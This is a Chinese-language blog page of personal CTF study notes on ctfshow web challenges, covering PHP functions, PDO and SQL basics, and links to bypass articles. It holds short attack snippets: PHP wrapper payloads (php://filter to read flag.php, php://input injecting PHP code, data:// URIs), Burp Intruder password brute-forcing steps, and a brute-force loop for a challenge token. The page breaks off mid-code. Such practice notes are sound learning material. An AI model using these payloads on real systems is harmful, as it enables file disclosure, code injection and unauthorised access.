<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="&amp;#x8BB0;&amp;#x5F55;&amp;#x4E00;&amp;#x4E0B;                           6.28       &amp;#x590D;&amp;#x4E60;curl&amp;#x7684;&amp;#x7528;&amp;#x6CD5;&amp;#xFF1A; &amp;#x5728;web65&amp;#x91CC;&amp;#x9762;&amp;#xFF08;&amp;#x88AB;&amp;#x7981;&amp;#x7528;&amp;#x4E">
<meta property="og:type" content="article">
<meta property="og:title" content="6.2">
<meta property="og:url" content="http://example.com/2022/06/20/6-20/index.html">
<meta property="og:site_name" content="Clutter Box">
<meta property="og:description" content="&amp;#x8BB0;&amp;#x5F55;&amp;#x4E00;&amp;#x4E0B;                           6.28       &amp;#x590D;&amp;#x4E60;curl&amp;#x7684;&amp;#x7528;&amp;#x6CD5;&amp;#xFF1A; &amp;#x5728;web65&amp;#x91CC;&amp;#x9762;&amp;#xFF08;&amp;#x88AB;&amp;#x7981;&amp;#x7528;&amp;#x4E">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/06/20/6-20/6-20/web25">
<meta property="og:image" content="http://example.com/2022/06/20/6-20/6-20/1656486496034.png">
<meta property="article:published_time" content="2022-06-20T07:39:01.000Z">
<meta property="article:modified_time" content="2022-07-15T02:33:25.375Z">
<meta property="article:author" content="Kirsten Carton">
<meta property="article:tag" content="ctfshow">
<meta property="article:tag" content="命令执行">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/06/20/6-20/6-20/web25"><title>6.2 | Clutter Box</title><link ref="canonical" href="http://example.com/2022/06/20/6-20/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><script src="https://www.googletagmanager.com/gtag/js?id=G-Q0LPD8MD2C" async=""></script><script>if (window.location.hostname !== 'localhost') {
  window.dataLayer = window.dataLayer || [];
  function gtag(){ dataLayer.push(arguments); }
  gtag('js', new Date());
  gtag('config', 'G-Q0LPD8MD2C');
}</script><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clutter Box</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">6.2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-06-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-07-15</span></span></div></header><div class="post-body">
        <h1 id="&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;">
          <a href="#&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;" class="headerlink" title="&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;"></a>&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</h1>
      
        <h3 id="6-28">
          <a href="#6-28" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-28" class="headerlink" title="6.28"></a>6.28</h3>
      <p>&#x590D;&#x4E60;curl&#x7684;&#x7528;&#x6CD5;&#xFF1A;</p>
<p><strong>&#x5728;web65&#x91CC;&#x9762;&#xFF08;&#x88AB;&#x7981;&#x7528;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x662F;&#x4E00;&#x79CD;&#x601D;&#x8DEF;ssrf&#xFF09;&#x4F7F;&#x7528;&#x4E86;&#x7F51;&#x4E0A;&#x7684;curl&#x7684;&#x4E00;&#x6BB5;&#xFF0C;&#x6458;&#x6284;&#x540E;&#x6539;&#x5730;&#x5740;;&#x6216;&#x8005;&#x4F7F;&#x7528;get_file_contents&#x8FDC;&#x7A0B;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</strong></p>
<p>&#x5728;69&#x9047;&#x5230;&#x4E86;foreach&#x51FD;&#x6570;&#x4E0E;glob&#x51FD;&#x6570;&#xFF0C;&#x8FD8;&#x6709;DirectoryIterator&#x8FD9;&#x4E2A;&#x7C7B;</p>
<span id="more"></span>

<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.w3cschool.cn/php/php-array-foreach.html">PHP&#x6570;&#x7EC4;foreach&#x5FAA;&#x73AF;_w3cschool</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39647458/article/details/116288425"> php &#x534F;&#x8BAE;,glob://&#x534F;&#x8BAE;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/124740776">&#x6D45;&#x8C08; php&#x539F;&#x751F;&#x7C7B;&#x7684;&#x5229;&#x7528; 1(&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x7C7B;)_</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  &#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x53EF;&#x4EE5;&#x4E0D;&#x770B;&#x524D;&#x9762;&#x7684;wp,&#x4E3B;&#x8981;&#x770B;&#x540E;&#x9762;&#x7684;&#x539F;&#x751F;&#x7C7B;&#x7684;&#x603B;&#x7ED3;</p>

        <h3 id="7-2">
          <a href="#7-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-2" class="headerlink" title="7.2"></a>7.2</h3>
      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">Open_basedir&#x7ED5;&#x8FC7; -</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>uaf&#x811A;&#x672C;&#x539F;&#x7406;&#xFF0C;&#x6709;&#x65F6;&#x95F4;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;</p>

        <h3 id="7-3">
          <a href="#7-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-3" class="headerlink" title="7.3"></a>7.3</h3>
      <p>&#x54C8;&#x54C8;&#xFF0C;&#x5565;&#x4E5F;&#x6CA1;&#x5B66;&#xFF0C;&#x5C31;&#x5B66;&#x4E86;&#x4E2A;uaf&#x7684;&#x539F;&#x7406;&#xFF0C;&#x60F3;&#x6362;PHP&#x73AF;&#x5883;&#x4E5F;&#x6CA1;&#x6362;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/73612451">UAF (Use After Free)&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x53CA;&#x5229;&#x7528;_</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>&#x987A;&#x4FBF;&#x6709;&#x4E2A;&#x5173;&#x4E8E;typedef&#x7684;&#x65B0;&#x7528;&#x6CD5;&#x4E5F;&#x5B66;&#x5B66;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/u014221279/article/details/50978204">typedef void (*Fun) (void) &#x7684;&#x7406;&#x89E3;&#x2014;&#x2014;&#x51FD;&#x6570;&#x6307;&#x9488;&#x2014;&#x2014;typedef&#x51FD;&#x6570;&#x6307;&#x9488;_</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type char (*ppp)(int);</span><br><span class="line">typedef  &#x8FD4;&#x56DE;&#x7C7B;&#x578B;(*&#x65B0;&#x7C7B;&#x578B;)(&#x53C2;&#x6570;&#x8868;)</span><br><span class="line"></span><br><span class="line">&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6307;&#x9488;&#x7C7B;&#x578B;&#x3002;</span><br><span class="line">   &#x6BD4;&#x5982;&#x539F;&#x51FD;&#x6570;&#x662F;   void   func(void);</span><br><span class="line">    &#x90A3;&#x4E48;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#x6307;&#x9488;&#x7C7B;&#x578B;&#x5C31;&#x662F;typedef   void   (*Fun)(void);</span><br><span class="line">    &#x7136;&#x540E;&#x7528;&#x6B64;&#x7C7B;&#x578B;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x6307;&#x5411;&#x51FD;&#x6570;&#x7684;&#x6307;&#x9488;&#xFF1A;   Fun   func1;</span><br><span class="line">    &#x5F53;func1&#x83B7;&#x53D6;&#x51FD;&#x6570;&#x5730;&#x5740;&#x4E4B;&#x540E;&#xFF0C;&#x90A3;&#x4E48;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x5411;&#x8C03;&#x7528;&#x539F;&#x51FD;&#x6570;&#x90A3;&#x6837;&#x6765;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF1A;   func1(void);</span><br></pre></td></tr></table></div></figure>

<p><strong>&#x7F3A;&#x5931;&#x7684;&#x77E5;&#x8BC6; &#x5BF9;&#x4E8E;73</strong></p>
<p>sql&#x8BED;&#x53E5;&#xFF1B;&#x8681;&#x5251;&#x7528;&#x6CD5;&#xFF1B;PDO&#x662F;&#x4EC0;&#x4E48;&#x3002;&#x3002;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pdo.html">PHP PDO | &#x83DC;&#x9E1F;&#x6559;&#x7A0B; (runoob.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="7-9">
          <a href="#7-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h3>
      <p>&#x6211;&#x662F;&#x4EC0;&#x4E48;&#x8FA3;&#x9E21;&#xFF0C;&#x8352;&#x5E9F;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#x5929;&#xFF0C;&#x5E72;&#x4E86;&#x4E9B;&#x4EC0;&#x4E48;&#x4E1C;&#x897F;&#xFF0C;&#x5565;&#x4E5F;&#x6CA1;&#x5E72;&#xFF0C;&#x6D6A;&#x8D39;&#x9752;&#x6625;&#xFF0C;&#x6D3B;&#x8BE5;&#x9AD8;&#x6570;&#x5B66;&#x8FD9;&#x4E48;&#x4E45;&#x767D;&#x767D;&#x6D6A;&#x8D39;&#x81EA;&#x5DF1;&#x71AC;&#x591C;&#x6362;&#x7684;&#x7684;&#x77E5;&#x8BC6;&#x8FD8;&#x53EA;&#x80FD;&#x9760;&#x8001;&#x5E08;&#x635E;&#x8D77;&#x6765;</p>
<p>&#x4E0D;&#x61C2;&#x7684;&#x65E0;&#x975E;&#x5C31;&#x662F;&#x4EC0;&#x4E48;&#xFF1A;</p>
<p>dsn,try&#x548C;catch,sql&#x4E0E;php&#x7684;&#x7ED3;&#x5408;&#x7F62;&#x4E86;</p>
<p>dsn:data source name</p>
<p>dbsm:database system management</p>
<p>dbname:database name</p>
<p>dbh:data buffer handler</p>
<hr>
<p>&#x6B64;&#x5904;&#x7528;&#x5230;&#x7684;PDO&#x63A5;&#x53E3;&#x6D89;&#x53CA;&#x5230;&#x7684;:</p>
<p>php&#x4E2D;&#x7684;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x7C7B;&#xFF1A;Exception</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> {</span><br><span class="line">    <span class="comment">/* &#x5C5E;&#x6027; */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* &#x65B9;&#x6CD5; */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ([ <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> [, <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">NULL</span> ]]] )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( <span class="keyword">void</span> ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( <span class="keyword">void</span> ) : <span class="keyword">void</span></span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x5728;&#x8FD9;&#x4E2A;&#x7C7B;&#x5F53;&#x4E2D;&#x76EE;&#x524D;&#x9047;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;</p>
<p><code>getMessage(),__toString</code></p>
<p>&#x4E24;&#x4E2A;&#x5192;&#x53F7; (::)&#x662F;&#x5BF9;<strong>&#x7C7B;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x7684;&#x9759;&#x6001;&#x5F15;&#x7528;</strong></p>
<p>information_schema &#x770B;&#x4F5C;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x786E;&#x5207;&#x8BF4;&#x662F;&#x4FE1;&#x606F;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5176;&#x4E2D;&#x4FDD;&#x5B58;&#x7740;&#x5173;&#x4E8E;MySQL&#x670D;&#x52A1;&#x5668;&#x6240;&#x7EF4;&#x62A4;&#x7684;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FE1;&#x606F;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1918345">Mysql&#x6CE8;&#x5165;&#x4E2D;load_file()&#x51FD;&#x6570;&#x7684;&#x4F7F;&#x7528;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://c.biancheng.net/view/7705.html">PHP PDO&#x662F;&#x4EC0;&#x4E48; (biancheng.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x8FD9;&#x662F;&#x4E2A;&#x5F88;&#x5168;&#x9762;&#x7684;&#x7F51;&#x7AD9;</p>

        <h3 id="7-10">
          <a href="#7-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h3>
      <p>&#x76EE;&#x524D;&#x9700;&#x8981;&#x5B66;&#x4E60;&#x7684;&#xFF1A;</p>
<p>mysql&#x5F31;&#x53E3;&#x4EE4;&#x653B;&#x51FB;&#xFF08;&#x679C;&#x7136;&#x9003;&#x4E0D;&#x8FC7;&#x7206;&#x7834;&#x8FD9;&#x4E00;&#x6B65;&#xFF09;</p>
<p>7.11 1:10 &#x2014;&#x7206;&#x7834;&#x5230;&#x4E86;25&#xFF08;25&#x8FD8;&#x6CA1;&#x505A;&#xFF09;&#xFF0C;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5230;76&#xFF08;&#x8FD8;&#x6CA1;&#x6709;&#x8BD5;&#x8FC7;76&#x7684;&#x7206;&#x7834;&#xFF09;&#xFF0C;77&#x8FD8;&#x6CA1;&#x505A;&#xFF08;&#x7761;&#x4E86;&#x7761;&#x4E86;&#xFF0C;&#x518D;&#x4E0D;&#x7761;&#x5C31;&#x5BC4;&#x4E86;&#xFF09;</p>

        <h3 id="7-13">
          <a href="#7-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-13" class="headerlink" title="7.13"></a>7.13</h3>
      <p>&#x641C;&#x5230;&#x4E00;&#x4E9B;&#x6CA1;&#x7528;&#x7684;&#x77E5;&#x8BC6;&#xFF1A;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/tylerlee008/article/details/78342764"> PHP&#x91CC;&#x4E00;&#x6839;&#x4E0B;&#x5212;&#x7EBF;&#x548C;&#x4E24;&#x4E0B;&#x5212;&#x7EBF;&#x7684;&#x5B9A;&#x4E49;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="&#x590D;&#x4E60;">
          <a href="#&#x590D;&#x4E60;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x590D;&#x4E60;" class="headerlink" title="&#x590D;&#x4E60;"></a>&#x590D;&#x4E60;</h1>
      <p>PHP&#x4F2A;&#x534F;&#x8BAE;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">GET&#x90E8;&#x5206;:    file=php://input</span><br><span class="line">POST&#x90E8;&#x5206;:   &lt;?php phpinfo;?&gt;</span><br><span class="line"></span><br><span class="line">data://text/plain</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></div></figure>

<p>6.20 &#x5230;33&#x9898;</p>

        <h1 id="&#x7206;&#x7834;">
          <a href="#&#x7206;&#x7834;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x7206;&#x7834;" class="headerlink" title="&#x7206;&#x7834;"></a>&#x7206;&#x7834;</h1>
      
        <h2 id="21">
          <a href="#21" class="heading-link"><i class="fas fa-link"></i></a><a href="#21" class="headerlink" title="21"></a>21</h2>
      <p>&#x4F7F;&#x7528;burpsuite,&#x7206;&#x7834;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;</p>
<p>intruder&#x6709;&#x56DB;&#x4E2A;&#x677F;&#x5757;&#xFF1A;target&#xFF0C;positions&#xFF0C;payloads&#xFF0C;options</p>
<ol>
<li>&#x8F7D;&#x5165;&#x5B98;&#x65B9;&#x9644;&#x4EF6;&#x7684;&#x5B57;&#x5178;&#xFF1B;&#x7ED9;&#x89E3;&#x7801;&#x52A0;&#x4E2A;&#x524D;&#x7F00;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;base64&#x7F16;&#x7801;&#x7684;&#x65B9;&#x5F0F;</li>
<li>&#x5728;payload_encoding&#x91CC;&#x9762;&#x4E0D;&#x9009;&#x4E2D;url&#x7684;=&#x53F7;&#xFF0C;&#x56E0;&#x4E3A;&#x9009;&#x62E9;&#x7684;&#x662F;base64encode</li>
<li>&#x5728;options&#x91CC;&#xFF1A;&#x589E;&#x5927;&#x7EBF;&#x7A0B;&#xFF0C;&#x51CF;&#x5C11;&#x7B49;&#x5F85;&#xFF1A;&#x5728;grep-match&#x91CC;&#x9762;add&#x4E00;&#x4E2A;flag&#x7684;&#x683C;&#x5F0F;&#xFF1A;ctfshow</li>
</ol>

        <h2 id="22">
          <a href="#22" class="heading-link"><i class="fas fa-link"></i></a><a href="#22" class="headerlink" title="22"></a>22</h2>
      <p>&#x7206;&#x7834;&#x5B50;&#x57DF;&#x540D;&#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x662F;phpinfo.me/domain&#x5DE5;&#x5177;</p>

        <h2 id="23">
          <a href="#23" class="heading-link"><i class="fas fa-link"></i></a><a href="#23" class="headerlink" title="23"></a>23</h2>
      <p>6.21 </p>
<p>&#x6211;&#x662F;&#x61A8;&#x61A8;&#xFF0C;6&#x6708;&#x7684;&#x9898;&#x7559;&#x5728;&#x4E86;&#x4E03;&#x6708;&#x6765;&#x770B;&#xFF0C;&#x6211;&#x7A76;&#x7ADF;&#x662F;&#x6709;&#x591A;&#x4E48;&#x6446;&#x70C2;</p>
<p>&#x4E0B;&#x9762;&#x662F;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&apos;token&apos;</span>])){</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&apos;token&apos;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>)){</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>))){</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



<p>&#x884C;&#x5427;&#xFF0C;&#x89C6;&#x9891;wp&#x5199;&#x7684;&#x662F;&#x7528;PHP&#x5C31;&#x53EF;&#x4EE5;&#x8DD1;&#x51FA;token&#xFF1B;&#x5F00;vscode&#x8BD5;&#x8BD5;&#x770B;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">10000</span>;<span class="variable">$i</span>++){</span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>)){</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>))){</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&apos;token = &apos;</span>.<span 